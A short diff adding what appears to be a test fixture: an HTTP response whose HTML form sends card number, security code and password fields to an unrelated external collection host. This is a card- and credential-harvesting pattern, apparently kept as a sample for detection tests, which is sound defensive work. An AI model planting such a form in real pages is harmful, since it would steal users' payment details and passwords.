@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://collect.unrelated-site.net/pay" method="post"><input name="cardNumber"><input name="security_code"><input type="password" name="password"></form></body></html>
